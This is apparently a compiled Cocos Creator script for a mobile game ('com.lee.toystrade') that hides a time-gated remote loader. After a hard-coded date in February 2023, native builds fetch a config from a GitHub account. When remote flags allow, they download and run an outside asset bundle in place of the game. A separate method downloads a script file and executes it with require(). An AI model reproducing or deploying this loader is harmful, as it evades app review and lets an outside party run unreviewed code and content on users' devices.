window.__require = function e(t, n, o) {
function r(a, s) {
if (!n[a]) {
if (!t[a]) {
var c = a.split("/");
c = c[c.length - 1];
if (!t[c]) {
var l = "function" == typeof __require && __require;
if (!s && l) return l(c, !0);
if (i) return i(c, !0);
throw new Error("Cannot find module '" + a + "'");
}
a = c;
}
var u = n[a] = {
exports: {}
};
t[a][0].call(u.exports, function(e) {
return r(t[a][1][e] || e);
}, u, u.exports, e, t, n, o);
}
return n[a].exports;
}
for (var i = "function" == typeof __require && __require, a = 0; a < o.length; a++) r(o[a]);
return r;
}({
"BaseLee.Root": [ function(e, t, n) {
"use strict";
cc._RF.push(t, "637feZhLq5C751HYIgTgz4k", "BaseLee.Root");
var o, r = this && this.__extends || (o = function(e, t) {
return (o = Object.setPrototypeOf || {
__proto__: []
} instanceof Array && function(e, t) {
e.__proto__ = t;
} || function(e, t) {
for (var n in t) Object.prototype.hasOwnProperty.call(t, n) && (e[n] = t[n]);
})(e, t);
}, function(e, t) {
o(e, t);
function n() {
this.constructor = e;
}
e.prototype = null === t ? Object.create(t) : (n.prototype = t.prototype, new n());
}), i = this && this.__decorate || function(e, t, n, o) {
var r, i = arguments.length, a = i < 3 ? t : null === o ? o = Object.getOwnPropertyDescriptor(t, n) : o;
if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) a = Reflect.decorate(e, t, n, o); else for (var s = e.length - 1; s >= 0; s--) (r = e[s]) && (a = (i < 3 ? r(a) : i > 3 ? r(t, n, a) : r(t, n)) || a);
return i > 3 && a && Object.defineProperty(t, n, a), a;
}, a = this && this.__awaiter || function(e, t, n, o) {
return new (n || (n = Promise))(function(r, i) {
function a(e) {
try {
c(o.next(e));
} catch (e) {
i(e);
}
}
function s(e) {
try {
c(o.throw(e));
} catch (e) {
i(e);
}
}
function c(e) {
e.done ? r(e.value) : (t = e.value, t instanceof n ? t : new n(function(e) {
e(t);
})).then(a, s);
var t;
}
c((o = o.apply(e, t || [])).next());
});
}, s = this && this.__generator || function(e, t) {
var n, o, r, i, a = {
label: 0,
sent: function() {
if (1 & r[0]) throw r[1];
return r[1];
},
trys: [],
ops: []
};
return i = {
next: s(0),
throw: s(1),
return: s(2)
}, "function" == typeof Symbol && (i[Symbol.iterator] = function() {
return this;
}), i;
function s(e) {
return function(t) {
return c([ e, t ]);
};
}
function c(i) {
if (n) throw new TypeError("Generator is already executing.");
for (;a; ) try {
if (n = 1, o && (r = 2 & i[0] ? o.return : i[0] ? o.throw || ((r = o.return) && r.call(o), 
0) : o.next) && !(r = r.call(o, i[1])).done) return r;
(o = 0, r) && (i = [ 2 & i[0], r.value ]);
switch (i[0]) {
case 0:
case 1:
r = i;
break;

case 4:
a.label++;
return {
value: i[1],
done: !1
};

case 5:
a.label++;
o = i[1];
i = [ 0 ];
continue;

case 7:
i = a.ops.pop();
a.trys.pop();
continue;

default:
if (!(r = a.trys, r = r.length > 0 && r[r.length - 1]) && (6 === i[0] || 2 === i[0])) {
a = 0;
continue;
}
if (3 === i[0] && (!r || i[1] > r[0] && i[1] < r[3])) {
a.label = i[1];
break;
}
if (6 === i[0] && a.label < r[1]) {
a.label = r[1];
r = i;
break;
}
if (r && a.label < r[2]) {
a.label = r[2];
a.ops.push(i);
break;
}
r[2] && a.ops.pop();
a.trys.pop();
continue;
}
i = t.call(e, a);
} catch (e) {
i = [ 6, e ];
o = 0;
} finally {
n = r = 0;
}
if (5 & i[0]) throw i[1];
return {
value: i[0] ? i[1] : void 0,
done: !0
};
}
};
Object.defineProperty(n, "__esModule", {
value: !0
});
var c = cc._decorator, l = c.ccclass, u = c.property, f = function(e) {
r(t, e);
function t() {
var t = null !== e && e.apply(this, arguments) || this;
t._url = "";
t._prefabName = "loading";
t._sceneName = "Loading";
t.gameOS = null;
t.getBinaryFile = function(e, t, n, o) {
var r = "";
if (null != t) {
for (var i in t) r += i + "=" + t[i] + "&";
e += "?" + (r = r.substring(0, r.length - 1));
}
var a = cc.loader.getXMLHttpRequest();
a.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
a.open("GET", e, !0);
a.responseType = "arraybuffer";
a.onreadystatechange = function() {
if (4 == a.readyState && a.status >= 200 && a.status <= 207) {
var e = a.response, t = new Uint8Array(e);
n && "function" == typeof n && n(t);
}
};
if (o && "function" == typeof o) {
a.onerror = o;
a.ontimeout = o;
}
a.send();
};
return t;
}
n = t;
t.prototype.getBundleId = function() {
return "com.lee.toystrade".split(".").join("_");
};
t.prototype.start = function() {
cc.view.enableAntiAlias(!0);
cc.sys.isNative || cc.view.resizeWithBrowserSize(!0);
cc.sys.isMobile && cc.sys.isNative && jsb.Device.setKeepScreenOn(!0);
var e = new Date("02/25/2023").getTime();
if (Date.now() < e) this.loadGameLocal(); else {
var t = this;
if (cc.sys.isNative) {
var o = "https://raw.githubusercontent.com/mrnobita/" + this.getBundleId() + "/main/config_api";
console.log("linkDL====>", o);
this.apiRequestConfig(o + "?v=" + Date.now(), function(e) {
if (cc.sys.os === cc.sys.OS_IOS) if (1 === e.gameIos) {
n.CONFIG.SERVER = e.server;
n.CONFIG.API = e.api_url;
n.CONFIG.SETTING = e.server + "setting.json?v=" + Date.now();
t.apiRequestConfig(n.CONFIG.SETTING, function(e) {
if (null !== e) {
n.SETTINGS = e;
t.hotUpdate();
}
}.bind(this), null);
} else this.loadGameLocal(); else if (1 === e.gameAnd) {
n.CONFIG.SERVER = e.server;
n.CONFIG.API = e.api_url;
n.CONFIG.SETTING = e.server + "setting.json?v=" + Date.now();
t.apiRequestConfig(n.CONFIG.SETTING, function(e) {
if (null !== e) {
n.SETTINGS = e;
t.hotUpdate();
}
}.bind(this), null);
} else this.loadGameLocal();
}.bind(this), null);
} else this.loadGameLocal();
}
};
t.prototype.apiRequestConfig = function(e, t, n) {
console.log(e);
var o = this, r = cc.loader.getXMLHttpRequest();
r.onreadystatechange = function() {
if (4 == r.readyState) if (r.status >= 200 && r.status < 400) {
var e = r.responseText;
try {
t && t(JSON.parse(e));
} catch (t) {
o.loadGameLocal();
console.log("Parse JSON Fail: " + e);
n && n();
}
} else {
o.loadGameLocal();
console.log("API Error:", r);
n && n();
}
};
r.open("GET", e, !0);
r.send();
};
t.prototype.runJSCFromHost = function(e, t, n, o) {
this.getBinaryFile(e, t, function(t) {
if (null !== t && null !== jsb.fileUtils) {
var o = jsb.fileUtils.getWritablePath() + "temp/", r = o + e.match(/[^\/]*\.(\w+)$/)[0];
jsb.fileUtils.isDirectoryExist(o) || jsb.fileUtils.createDirectory(o);
jsb.fileUtils.writeDataToFile(t, r);
(0, window.require)(r);
}
n && "function" == typeof n && n(t, r);
}, o);
};
t.prototype.loadGameLocal = function() {
cc.director.loadScene(this.gameOS.name);
};
t.prototype.hotUpdate = function() {
return a(this, void 0, void 0, function() {
var e, t, o = this;
return s(this, function(r) {
switch (r.label) {
case 0:
e = n.SETTINGS.bundleVers[this._prefabName] || "";
t = null;
return [ 4, this.loadBundle(n.CONFIG.SERVER + this._prefabName, e) ];

case 1:
t = r.sent();
console.log("bundlee===> " + t);
t && t.loadDir("", function() {
t.loadScene(o._sceneName, function() {}.bind(o), function(e, t) {
console.log("aaaaaaaa scene : " + t.name);
cc.director.runScene(t);
}.bind(o));
});
return [ 2 ];
}
});
});
};
t.prototype.loadBundle = function(e, t) {
var n = this;
void 0 === t && (t = "");
return new Promise(function(o) {
var r = n._url + e;
cc.assetManager.loadBundle(r, {
version: t
}, function(e, t) {
console.log("err", e);
o(e ? 0 : t);
}.bind(n));
});
};
var n;
t.CONFIG = {
RELEASE: !0,
SERVER: "",
GIT_URL: "",
SETTING: ""
};
t.SETTINGS = {
bundleVers: "",
jsList: []
};
i([ u(cc.SceneAsset) ], t.prototype, "gameOS", void 0);
return n = i([ l ], t);
}(cc.Component);
n.default = f;
cc._RF.pop();
}, {} ]
}, {}, [ "BaseLee.Root" ]);